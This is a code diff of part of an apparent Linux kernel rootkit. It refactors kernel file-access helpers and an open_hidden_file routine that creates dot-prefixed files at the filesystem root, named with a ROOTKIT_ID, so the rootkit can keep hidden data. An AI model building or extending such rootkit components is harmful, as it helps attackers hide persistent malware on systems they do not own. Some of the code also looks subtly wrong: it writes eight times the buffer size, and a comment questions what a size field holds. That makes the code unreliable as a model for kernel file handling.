@@ -7,46 +7,45 @@
 extern char ROOTKIT_ID[];
 
 struct kern_file{ //file holding data for file reading/writing
-	struct file *fd; //file descriptor
-	loff_t pos;
-	size_t count;
-    ssize_t ret;
+	struct file *fp; //pointer of file
+	loff_t pos; //position to write to
+	size_t count; //count of the size of the file?
+  ssize_t ret; //just a placeholder for when a number is returned
 };
 
-static struct kern_file *open_file(char *path, int flags){ //opens file from pat3h
+static struct kern_file *open_file(char *path, int flags){
 	//code from https://stackoverflow.com/questions/1184274/read-write-files-within-a-linux-kernel-module
 	struct kern_file *file=kzalloc(sizeof(struct kern_file), GFP_KERNEL); //file descriptor
-    int err = 0; //error code
+  int err = 0; //error code
 
-    file->fd = filp_open(path, flags, 0666); //opens the file in append mode
-    if (IS_ERR(file->fd)) { //if file doesnt exist
-		printk("[open_file] error opening file\n");
-		err = PTR_ERR(file->fd); //get error code
-		printk("[open_file] error = %i\n", err);
-		return (struct kern_file*) NULL; //return NULL
-    }
-    return file; //return file
+  file->fp = filp_open(path, flags, 0666); //opens the file in append mode //UPDATE change permissions from 666
+  if (IS_ERR(file->fp)) { //if file doesnt exist
+		err = PTR_ERR(file->fp);
+		printk("[rootkit][files.c::open_file] ERROR    unable to open file: error code %i\n", err);
+		return (struct kern_file*) NULL;
+  }
+  return file;
 }
 
-static int file_close(struct kern_file *file){ //close file
-	filp_close(file->fd, NULL); //closes file
-	kfree(file); //delete kern_file obj
-	return 0; //return 0 for no error
+static int file_close(struct kern_file *file){
+	filp_close(file->fp, NULL);
+	kfree(file);
+	return 0;
 }
 
-static int file_read(struct kern_file *file, void *buf){ //reads data from file
+static int file_read(struct kern_file *file, void *buf){
 	//code from https://stackoverflow.com/questions/69633382/using-kernel-read-kernel-write-to-read-input-txts-content-write-it-into-out
 	file->pos = 0;
-	kernel_read(file->fd, buf, file->count, &(file->pos));
-	return 0; //returns size of file
+	kernel_read(file->fp, buf, file->count, &(file->pos));
+	return (int) file->count - (int) file->pos; //returns how many bytes not read
 }
 
-static int file_write(struct kern_file *file, void *buf, int buf_size){ //writes data to file
+static int file_write(struct kern_file *file, void *buf, int buf_size){
 	//code from https://stackoverflow.com/questions/69633382/using-kernel-read-kernel-write-to-read-input-txts-content-write-it-into-out
-	file->pos = 0;
-	file->ret = kernel_write(file->fd, buf, buf_size*8, &(file->pos)); //writes data to file
-	if (file->ret!=buf_size*8){ //not written everything
-		printk("[rootkit] kernel_write- unable to write %i bytes- file->ret = %i   buf_size=%i", buf_size*8-file->ret, file->ret, buf_size);
+	file->pos = 0; //CHECK could be writing to start, but is in append mode so need to check
+	file->ret = kernel_write(file->fp, buf, buf_size*8, &(file->pos)); //writes data to file
+	if (file->ret!=buf_size*8){ //not all bytes writtens
+		printk("[rootkit][files.c::file_write] ERROR    unable to write %i bytes to file: file->ret=%i   buf_size=%i\n", buf_size*8-file->ret, file->ret, buf_size);
 		return buf_size*8-file->ret; //returns number of bytes not written
 	}
 	return 0;
@@ -55,17 +54,17 @@ static int file_write(struct kern_file *file, void *buf, int buf_size){ //writes
 
 static struct kern_file *open_hidden_file(char *filename){ //opens file in /bin prepended with ROOTKIT_ID or creates if doesn't exist
 	struct kern_file *hidden_file;
-
-	char *path; //char array to hold name of directory
+	char *path;
 	path = kzalloc(BUFFER_SIZE, GFP_KERNEL); //allocates memory
 	sprintf(path, "/.%s%s", ROOTKIT_ID, filename); //formats name of directory to be made
-	printk("[open_hidden_file] path = %s\n", path);
-	hidden_file = open_file(path, O_APPEND | O_RDWR);
-	if (hidden_file==NULL){ //file doesn't exist
-		hidden_file = open_file(path, O_CREAT | O_RDWR);
+	printk("[rootkit][files.c::open_hidden_file] DEBUG    path = %s\n", path);
+	hidden_file = open_file(path, O_APPEND | O_RDWR); //opens file in append mode
+	if (hidden_file==NULL){ //if file doesn't exist
+		printk("[rootkit][files.c::open_hidden_file] DEBUG    file doesn't exist\n");
+		hidden_file = open_file(path, O_CREAT | O_RDWR); //creates file
 	}
-	if (hidden_file==NULL){ //file doesn't exist
-		printk("[open_hidden_file] error opening/creating file\n");
+	if (hidden_file==NULL){ //if file doesn't exist
+		printk("[rootkit][files.c::open_hidden_file] ERROR    unable to open/create file\n");
 	}
     return hidden_file; //return file
 }
